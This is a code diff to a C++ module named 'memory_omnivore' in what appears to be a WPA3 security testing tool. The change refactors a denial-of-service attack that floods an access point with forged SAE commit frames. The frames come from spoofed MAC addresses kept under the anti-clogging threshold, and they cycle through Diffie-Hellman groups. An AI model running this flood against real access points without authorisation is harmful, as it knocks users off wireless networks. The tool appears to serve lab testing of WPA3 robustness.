@@ -1,7 +1,7 @@
 #include "attacks/DoS_hard/memory_omnivore/memory_omnivore.h"
 
-#include <random>
 #include <tins/tins.h>
+#include <unordered_map>
 
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
 #include "attacks/DoS_hard/dos_helpers.h"
@@ -19,8 +19,6 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::memory_omnivore {
-static constexpr uint16_t DH_GROUPS[] = { 19, 20, 21 };
-static constexpr size_t N_DH_GROUPS = size(DH_GROUPS);
 
 static vector<HWAddress<6>> build_mac_pool(RunStatus &rs, const int pool_size, const bool use_connected_stas) {
 	vector<HWAddress<6>> pool;
@@ -52,14 +50,7 @@ void run_attack(RunStatus &rs) {
 	const ActorPtr attacker = rs.get_actor("attacker");
 	const ActorPtr ap = rs.get_actor("ap");
 
-	// Capture real scalar+element via wpa_supplicant before switching to monitor
 	log(LogLevel::INFO, "Capturing SAE commit values...");
-	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, attacker.get(SK::iface), attacker.get_mon_iface(), hostapd::get_ssid(rs, "ap"), ap.get(SK::mac), 30);
-
-	if(!sae_params.has_value()) throw run_err("Failed to capture SAE commit values");
-
-	log(LogLevel::INFO, "Setup done, group_id=%u, scalar size={}", sae_params->group_id, sae_params->scalar.size());
 
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
@@ -68,27 +59,46 @@ void run_attack(RunStatus &rs) {
 	const bool random_dh = att_cfg.at("random_dh_groups").get<bool>();
 	const bool use_conn_stas = att_cfg.at("use_connected_stas").get<bool>();
 
+	const string ap_ssid = hostapd::get_ssid(rs, "ap");
+	const string ssid = ap_ssid.empty() ? hostapd::get_ssid(rs, "client") : ap_ssid;
+	const HWAddress<6> ap_mac = ap.get(SK::mac);
+
+	auto sae_per_group = random_dh
+		? cookie_guzzler::get_commit_values_all_groups(rs, attacker.get(SK::iface), attacker.get_mon_iface(), ssid, ap_mac)
+		: [&]() -> unordered_map<uint16_t, sae_helper::SAEPair> {
+			auto s = cookie_guzzler::get_commit_values(rs, attacker.get(SK::iface), attacker.get_mon_iface(), ssid, ap_mac, 30); //TODO hardcoded sae group
+			if(!s) throw run_err("Failed to capture SAE commit values");
+			return {{s->group_id, std::move(*s)}};
+		}();
+
+	if(sae_per_group.empty()) throw run_err("Failed to capture SAE commit values for any group");
+
+	vector<uint16_t> available_groups;
+	for(const auto &[gid, sae] : sae_per_group) {
+		log(LogLevel::INFO, "Group {}: scalar={}B element={}B", gid, sae.scalar.size(), sae.element.size());
+		available_groups.push_back(gid);
+	}
+	ranges::sort(available_groups);
+
 	// Pool size must stay strictly below ACM threshold
 	const int pool_size = max(1, acm_threshold - 1);
 
 	const vector<HWAddress<6>> mac_pool = build_mac_pool(rs, pool_size, use_conn_stas);
 
 	PacketSender sender(attacker.get_mon_iface());
-	mt19937 rng(random_device{}());
-	uniform_int_distribution<size_t> group_dist(0, N_DH_GROUPS - 1);
 
 	rs.start_observers();
-	log(LogLevel::INFO, "Attack started");
+	log(LogLevel::INFO, "Attack started with {} group(s), pool_size={}", available_groups.size(), pool_size);
 
-	size_t mac_idx = 0;
+	size_t frame_idx = 0;
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
 	dos_helpers::timed_burst(
 		sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
-			const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
-			mac_idx++;
-			sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
-			return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
+			const auto &sta_mac = mac_pool[frame_idx % mac_pool.size()];
+			const uint16_t gid = random_dh ? available_groups[frame_idx % available_groups.size()] : available_groups.front();
+			frame_idx++;
+			return make_sae_commit(ap_mac, sta_mac, sae_per_group.at(gid));
 		});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
 	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));
